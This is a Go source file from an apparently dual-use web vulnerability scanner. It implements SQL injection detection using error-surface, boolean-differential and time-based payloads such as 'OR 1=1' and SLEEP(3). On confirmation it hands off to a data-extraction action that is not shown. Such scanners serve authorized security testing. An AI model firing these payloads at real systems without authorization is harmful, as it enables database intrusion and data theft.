package hacker

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/NICE-DEV226/nice-Scan/internal/detect"
	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

// SQLiAction runs only injects that are readable and attributable:
//
//   - error-surface probes against a benign baseline (an error message is
//     a signal only when the baseline page does not carry the identical
//     text);
//   - boolean-differential pairs — TRUE (OR 1=1) and FALSE (AND 1=2) —
//     replayed for stability before any claim;
//   - gated time-based probes: a sleep that is confirmed by two delayed
//     responses above the endpoint's own baseline latency.
//
// The previous implementation credited a "SQL Injection" finding when a
// word like "Oracle" appeared anywhere on a payload response, measured a
// single latency sample without a baseline, and shipped destructive
// payloads (DROP TABLE) — none of that is evidence.
type SQLiAction struct{}

func (a *SQLiAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "SQL Injection",
		Description: "Baseline-differential boolean, error-surface and gated time detection",
		Priority:    50,
		// Self-qualifying: every verdict needs its own double-control (a
		// benign baseline plus either a replayed boolean differential or a
		// 2/2 gated latency above that baseline). Requiring a has_sqli
		// capability seeded from remote text left the whole feature dead in
		// orchestrated runs: nothing in the flow ever produced it (proven
		// end-to-end against an injectable target), while the wire-valid
		// detection code sat behind a gate no scheduled action opened.
		Requires: []string{},
		Provides: []string{"has_sqli_exploit"},
	}
}

var (
	// errorShapes: quote-break probes value-only; applied alone with the
	// baseline as the differential control.
	sqliErrorValues = []string{"1'", `1"`, `1')`}

	// boolean pairs, quote-mode and numeric-mode, same length per pair.
	sqliBooleanPairs = []struct{ t, f string }{
		{`1' OR 1=1-- -`, `1' AND 1=2-- -`},
		{`1 OR 1=1`, `1 AND 1=2`},
	}

	// time payloads, one per SQL family; sleepSeconds defines the gate.
	sqliTimeValues = []string{
		`1' OR SLEEP(3)-- -`,
		`1' OR pg_sleep(3)-- -`,
		`1'; WAITFOR DELAY '0:0:3'-- -`,
	}
	constSleepGate = 2300 * time.Millisecond
)

func (a *SQLiAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	// endpoint + param pairs; pages with explicit query params first,
	// fallback to a bounded common list for endpoints that carry none.
	type probeTarget struct {
		url   string
		param string
	}
	var pairs []probeTarget
	seen := map[string]bool{}
	addPair := func(u, param string) {
		key := u + "|" + param
		if seen[key] {
			return
		}
		seen[key] = true
		pairs = append(pairs, probeTarget{url: u, param: param})
	}
	for _, ep := range kb.GetEndpoints() {
		extracted := extractURLParams(ep.Path)
		if len(extracted) > 0 {
			// the endpoint advertises its parameters — probe those
			for _, param := range extracted {
				addPair(ep.Path, param)
			}
			continue
		}
		// query-less endpoints only get the bounded fallback battery
		for i, param := range commonSQLiParams {
			if i >= sqliFallbackParamCap {
				break
			}
			addPair(ep.Path, param)
		}
	}
	if len(pairs) == 0 {
		for _, p := range kb.GetPages() {
			for _, param := range extractURLParams(p.URL) {
				addPair(p.URL, param)
			}
			if len(extractURLParams(p.URL)) > 0 {
				continue
			}
			for i, param := range commonSQLiParams {
				if i >= sqliFallbackParamCap {
					break
				}
				addPair(p.URL, param)
			}
		}
	}

	for _, pt := range pairs {
		select {
		case <-ctx.Done():
			return ActionResult{Findings: findings, Actions: spawned}
		default:
		}

		benURL := setQueryParam(pt.url, pt.param, "1")
		baseResp, err := client.Do(ctx, &types.Request{Method: "GET", URL: benURL})
		if err != nil || baseResp == nil {
			continue
		}
		_, _, baseHasError := detect.SQLErrorMatch(string(baseResp.Body))

		// ── A. error-surface probes (read-only, baseline-controlled) ──
		for _, ev := range sqliErrorValues {
			r, err := client.Do(ctx, &types.Request{Method: "GET", URL: setQueryParam(pt.url, pt.param, ev)})
			if err != nil || r == nil {
				continue
			}
			db, _, hasErr := detect.SQLErrorMatch(string(r.Body))
			if !hasErr {
				continue
			}
			// the baseline already carries the same backend error text —
			// the message is the endpoint's failure shape, not a leak
			// caused by our quote-break.
			if baseHasError {
				break
			}
			findings = append(findings, Finding{
				Type:     "sqli_error_surfaces",
				Name:     fmt.Sprintf("SQLi error surfacing: %s via param %s", db, pt.param),
				Severity: SevMedium,
				Description: fmt.Sprintf(
					"An anchored %s error message surfaced on the quote-break probe and is absent from the benign baseline (param %q)", db, pt.param),
				Evidence: setQueryParam(pt.url, pt.param, ev),
			})
			break
		}

		// ── B. boolean-differential pairs, replay-gated ─────────────────
		confirmed := false
		for _, pr := range sqliBooleanPairs {
			rT1, err1 := client.Do(ctx, &types.Request{Method: "GET", URL: setQueryParam(pt.url, pt.param, pr.t)})
			rF1, errF1 := client.Do(ctx, &types.Request{Method: "GET", URL: setQueryParam(pt.url, pt.param, pr.f)})
			if err1 != nil || errF1 != nil || rT1 == nil || rF1 == nil {
				continue
			}
			if _, _, fErr := detect.SQLErrorMatch(string(rF1.Body)); fErr {
				// FALSE payload tripped a syntax error: the pair is not a
				// boolean oracle, the error surface covers the signal.
				continue
			}

			t1 := sizeDiffers(len(baseResp.Body), len(rT1.Body), 0.15)
			f1 := sizeDiffers(len(baseResp.Body), len(rF1.Body), 0.15)
			tfdiv := sizeDiffers(len(rT1.Body), len(rF1.Body), 0.15)
			if !t1 || !f1 || !tfdiv {
				continue
			}

			// Stability replay: the differential must reproduce.
			rT2, e2 := client.Do(ctx, &types.Request{Method: "GET", URL: setQueryParam(pt.url, pt.param, pr.t)})
			rF2, eF2 := client.Do(ctx, &types.Request{Method: "GET", URL: setQueryParam(pt.url, pt.param, pr.f)})
			if e2 != nil || eF2 != nil || rT2 == nil || rF2 == nil {
				continue
			}
			t2 := sizeDiffers(len(baseResp.Body), len(rT2.Body), 0.10)
			f2 := sizeDiffers(len(baseResp.Body), len(rF2.Body), 0.10)
			tf2 := sizeDiffers(len(rT2.Body), len(rF2.Body), 0.10)
			if !t2 || !f2 || !tf2 {
				continue
			}

			findings = append(findings, Finding{
				Type:     "sqli_boolean",
				Name:     fmt.Sprintf("SQLi boolean-differential confirmed: param %s", pt.param),
				Severity: SevHigh,
				Description: fmt.Sprintf(
					"TRUE (%s) and FALSE (%s) states reproduce a stable content differential across two rounds on the same endpoint (param %q)",
					pr.t, pr.f, pt.param),
				Evidence: fmt.Sprintf(
					"TRUE: %s → %d B\nFALSE: %s → %d B\nbaseline → %d B\ntwo required rounds agree",
					setQueryParam(pt.url, pt.param, pr.t), len(rT1.Body),
					setQueryParam(pt.url, pt.param, pr.f), len(rF1.Body),
					len(baseResp.Body)),
				Details: map[string]string{
					"param":    pt.param,
					"method":   "boolean-differential-replayed",
					"endpoint": benURL,
				},
			})
			kb.AddCapability(Capability{
				Name:   "has_sqli_exploit",
				Origin: OriginVerified,
				Target: target,
				Details: map[string]string{
					"param":     pt.param,
					"method":    "boolean-differential",
					"parameter": pt.param,
				},
			})
			spawned = append(spawned, &SQLiDataExtractAction{
				vulnURL: setQueryParam(pt.url, pt.param, pr.t),
				param:   pt.param,
				payload: pr.t,
			})
			confirmed = true
			break
		}

		// ── C. gated time-based probes (2 delayed responses required) ───
		if !confirmed {
			for _, tv := range sqliTimeValues {
				r1, err := client.Do(ctx, &types.Request{
					Method: "GET", URL: setQueryParam(pt.url, pt.param, tv)})
				if err != nil || r1 == nil {
					continue
				}
				if r1.Duration < sleepGateLatency(baseResp) {
					continue
				}
				// confirm with a second delayed sample; 2/2 or discard
				r2, err2 := client.Do(ctx, &types.Request{
					Method: "GET", URL: setQueryParam(pt.url, pt.param, tv)})
				if err2 != nil || r2 == nil {
					continue
				}
				if r2.Duration < sleepGateLatency(baseResp) {
					continue
				}
				findings = append(findings, Finding{
					Type:     "sqli_time",
					Name:     fmt.Sprintf("SQLi time-based confirmed: param %s", pt.param),
					Severity: SevHigh,
					Description: fmt.Sprintf(
						"Sleep payload delayed two consecutive responses above the endpoint's baseline latency (%v then %v with baseline %v)",
						r1.Duration, r2.Duration, baseResp.Duration),
					Evidence: setQueryParam(pt.url, pt.param, tv),
					Details: map[string]string{
						"param":    pt.param,
						"method":   "time-gated-2-of-2",
						"baseline": baseResp.Duration.String(),
					},
				})
				kb.AddCapability(Capability{
					Name:   "has_sqli_exploit",
					Origin: OriginVerified,
					Target: target,
					Details: map[string]string{
						"param":  pt.param,
						"method": "time-gated",
					},
				})
				spawned = append(spawned, &SQLiDataExtractAction{
					vulnURL: setQueryParam(pt.url, pt.param, tv),
					param:   pt.param,
					payload: tv,
				})
				break
			}
		}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

// sleepGateLatency computes the delay threshold for one time-probe sample:
// an absolute floor (SLEEP(3) realistically overshoots it) or 1.2x the
// baseline latency, whichever dominates. On endpoints with a baseline
// above ~1.9s the sleep-3 gate bars the verdict — a documented
// limitation: latency evidence needs the pairing to stay trustworthy.
func sleepGateLatency(base *types.Response) time.Duration {
	floor := constSleepGate
	if base == nil || base.Duration <= 0 {
		return floor
	}
	if scaled := base.Duration * 12 / 10; scaled > floor {
		return scaled
	}
	return floor
}

// sizeDiffers reports whether two sizes differ by at least ratio relative
// to the larger one.
func sizeDiffers(a, b int, ratio float64) bool {
	la, lb := float64(a), float64(b)
	m := la
	if lb > m {
		m = lb
	}
	if m == 0 {
		return false
	}
	d := la - lb
	if d < 0 {
		d = -d
	}
	return d/m >= ratio
}

var commonSQLiParams = []string{
	"id", "user_id", "userId", "user", "uid", "username",
	"page", "p", "cat", "category", "product", "prod",
	"order", "sort", "search", "q", "s", "query",
	"file", "path", "dir", "action", "cmd",
	"email", "pass", "url", "redirect",
}

// sqliFallbackParamCap bounds blind-hover probing when the endpoint carries
// no extractable parameters: 14 shapes x ≤11 requests keeps the wire load
// predictable instead of the previous unlimited battery.
const sqliFallbackParamCap = 14

func extractURLParams(urlStr string) []string {
	var params []string
	if strings.Contains(urlStr, "?") {
		parts := strings.SplitN(urlStr, "?", 2)
		for _, pair := range strings.Split(parts[1], "&") {
			kv := strings.SplitN(pair, "=", 2)
			if len(kv) == 2 && len(kv[0]) > 0 {
				params = append(params, kv[0])
			}
		}
	}
	return params
}

// setQueryParam replaces (or appends) one parameter, PRESERVING the other
// query parameters: the previous implementations rebuilt the query with
// only the probe param, which dropped state parameters an endpoint
// required to even answer.
func setQueryParam(rawURL, param, rawValue string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		sep := "?"
		if strings.Contains(rawURL, "?") {
			sep = "&"
		}
		return rawURL + sep + url.QueryEscape(param) + "=" + url.QueryEscape(rawValue)
	}
	q := u.Query()
	q.Set(param, rawValue)
	u.RawQuery = q.Encode()
	return u.String()
}
